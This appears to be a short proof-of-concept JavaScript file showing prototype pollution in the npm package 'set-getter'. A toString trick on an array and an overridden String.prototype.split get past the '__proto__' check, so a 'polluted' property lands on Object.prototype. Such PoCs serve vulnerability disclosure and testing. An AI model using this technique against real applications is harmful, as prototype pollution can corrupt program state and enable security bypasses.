var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var setGetter = require('set-getter');
var obj = {};
console.log({}.polluted);
setGetter(obj, 'constructor.prototype.polluted', function (polluted) {
    return 'yes';
});
console.log({}.polluted);